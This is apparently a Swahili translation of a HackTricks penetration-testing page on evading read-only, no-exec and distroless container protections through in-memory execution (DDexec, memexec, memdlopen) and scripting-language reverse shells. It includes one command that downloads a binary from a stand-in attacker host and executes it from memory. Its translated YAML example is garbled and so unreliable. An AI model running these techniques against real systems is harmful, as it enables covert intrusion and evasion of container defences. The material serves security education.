# Kudukua ulinzi wa FS: soma tu / hakuna-exec / Distroless

<details>

<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ikiwa una nia ya **kazi ya kudukua** na kudukua yasiyodukuliwa - **tunakupa kazi!** (_inahitajika uwezo wa kuandika na kuzungumza kwa ufasaha wa Kipolishi_).

{% embed url="https://www.stmcyber.com/careers" %}

## Video

Katika video zifuatazo unaweza kupata mbinu zilizotajwa kwenye ukurasa huu zilizoelezwa kwa undani zaidi:

* [**DEF CON 31 - Kuchunguza Ubadilishaji wa Kumbukumbu ya Linux kwa Siri na Kuepuka**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Mashambulizi ya siri na DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Soma tu / hali ya hakuna-exec

Inazidi kuwa kawaida kupata mashine za linux zilizomountiwa na **ulinzi wa mfumo wa faili wa soma tu (ro)**, hasa katika vyombo. Hii ni kwa sababu ya kukimbia chombo na mfumo wa faili wa ro ni rahisi kama kuweka **`readOnlyRootFilesystem: kweli`** katika `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: kweli
</strong>    command: ["sh", "-c", "wakati wa kweli; fanya usingizi 1000; fanyika"]
</code></pre>

Hata hivyo, hata kama mfumo wa faili umemountiwa kama ro, **`/dev/shm`** bado itakuwa inaweza kuandikwa, hivyo ni uongo hatuwezi kuandika chochote kwenye diski. Walakini, folda hii itakuwa **imemountiwa na ulinzi wa hakuna-exec**, hivyo ikiwa unapakua binary hapa **hutaweza kuitekeleza**.

{% hint style="warning" %}
Kutoka mtazamo wa timu nyekundu, hii inafanya **kuwa ngumu kupakua na kutekeleza** binaries ambazo hazipo tayari kwenye mfumo (kama backdoors au wachunguzi kama `kubectl`).
{% endhint %}

## Kudukua Rahisi: Scripts

Tafadhali kumbuka nilitaja binaries, unaweza **kutekeleza skripti yoyote** ikiwa tu msomaji yuko ndani ya chombo, kama **skripti ya shell** ikiwa `sh` iko au **skripti ya python** ikiwa `python` imefungwa.

Walakini, hii pekee haitoshi kutekeleza backdoor yako ya binary au zana nyingine za binary unaweza kuhitaji kutekeleza.

## Kudukua Kumbukumbu

Ikiwa unataka kutekeleza binary lakini mfumo wa faili hauruhusu hivyo, njia bora ya kufanya hivyo ni kwa **kutekeleza kutoka kumbukumbu**, kwani **ulinzi hauwafai huko**.

### Kudukua FD + kutekeleza syscall

Ikiwa una injini za skripti zenye nguvu ndani ya chombo, kama **Python**, **Perl**, au **Ruby** unaweza kupakua binary kutekeleza kutoka kumbukumbu, kuhifadhi kwenye maelezo ya faili ya kumbukumbu (`create_memfd` syscall), ambayo haitalindwa na ulinzi huo kisha itaomba **syscall ya exec** ikionyesha **fd kama faili ya kutekeleza**.

Kwa hii unaweza kutumia mradi [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kumpitisha binary na itazalisha skripti katika lugha iliyotajwa na **binary iliyosongwa na b64 encoded** pamoja na maagizo ya **kudecode na kudecompress** katika **fd** iliyoundwa kwa kuita `create_memfd` syscall na wito wa **syscall ya exec** kuiendesha.

{% hint style="warning" %}
Hii haitafanya kazi katika lugha zingine za skripti kama PHP au Node kwa sababu hawana njia yoyote ya msingi ya kuita **syscalls za raw** kutoka kwa skripti, hivyo haiwezekani kuita `create_memfd` kuunda **fd ya kumbukumbu** kuhifadhi binary.

Zaidi ya hayo, kuunda **fd ya kawaida** na faili katika `/dev/shm` haitafanya kazi, kwa sababu hautaruhusiwa kuitekeleza kwa sababu ya **ulinzi wa hakuna-exec** utatumika.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni mbinu inayokuwezesha **kurekebisha kumbukumbu ya mchakato wako mwenyewe** kwa kubadilisha **`/proc/self/mem`** yake.

Hivyo, **kudhibiti msimbo wa mkusanyiko** unaotekelezwa na mchakato, unaweza kuandika **shellcode** na "kubadilisha" mchakato kutekeleza **msimbo wowote wa aina yoyote**.

{% hint style="success" %}
**DDexec / EverythingExec** itakuruhusu kupakia na **kutekeleza** **shellcode** yako mwenyewe au **binary yoyote** kutoka **kumbukumbu**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Kwa maelezo zaidi kuhusu hii technique angalia Github au:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni hatua ya asili ya DDexec. Ni **DDexec shellcode demonised**, hivyo kila wakati unapotaka **kuendesha binary tofauti** hauitaji kuzindua upya DDexec, unaweza tu kuendesha shellcode ya memexec kupitia technique ya DDexec na kisha **kuwasiliana na huyu deamon ili kupitisha binaries mpya za kupakia na kuendesha**.

Unaweza kupata mfano jinsi ya kutumia **memexec kuendesha binaries kutoka kwa PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Kwa lengo kama la DDexec, technique ya [**memdlopen**](https://github.com/arget13/memdlopen) inaruhusu njia **rahisi ya kupakia binaries** kwenye kumbukumbu kwa baadaye kuziendesha. Inaweza kuruhusu hata kupakia binaries zenye mahitaji.

## Kupitisha Distroless

### Ni nini distroless

Vyombo vya distroless vinavyo **vipengele vichache sana vinavyohitajika kuendesha programu au huduma maalum**, kama maktaba na mahitaji ya runtime, lakini vinaweka pembeni vipengele vikubwa kama meneja wa pakiti, shell, au zana za mfumo.

Lengo la vyombo vya distroless ni **kupunguza eneo la mashambulizi ya vyombo kwa kufuta vipengele visivyo vya lazima** na kupunguza idadi ya mapungufu yanayoweza kutumiwa.

### Reverse Shell

Katika chombo cha distroless unaweza **hata usipate `sh` au `bash`** kupata shell ya kawaida. Pia hutapata binaries kama `ls`, `whoami`, `id`... kila kitu unachozoea kuendesha kwenye mfumo.

{% hint style="warning" %}
Hivyo basi, **hutaweza** kupata **reverse shell** au **kuorodhesha** mfumo kama kawaida.
{% endhint %}

Hata hivyo, ikiwa chombo kilichoharibiwa kinakimbia kwa mfano wavuti ya flask, basi python imewekwa, na hivyo unaweza kupata **Python reverse shell**. Ikiwa inakimbia node, unaweza kupata Node rev shell, na vivyo hivyo na zaidi ya **lugha ya scripting**.

{% hint style="success" %}
Kwa kutumia lugha ya scripting unaweza **kuorodhesha mfumo** kwa kutumia uwezo wa lugha.
{% endhint %}

Ikiwa hakuna **ulinzi wa `read-only/no-exec`** unaweza kutumia reverse shell yako kudanganya mfumo wa faili na **kuwatekeleza**.

{% hint style="success" %}
Hata hivyo, katika aina hii ya vyombo ulinzi huu kawaida utakuwepo, lakini unaweza kutumia **techniques za awali za utekelezaji wa kumbukumbu kuzipita**.
{% endhint %}

Unaweza kupata **mifano** jinsi ya **kutumia baadhi ya mapungufu ya RCE** kupata **reverse shells za lugha za scripting** na kutekeleza binaries kutoka kumbukumbu katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ikiwa una nia ya **kazi ya udukuzi** na kudukua yasiyoweza kudukuliwa - **tunahitaji wewe!** (_ujuzi wa Kipolishi ulioandikwa na kuzungumzwa unahitajika_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
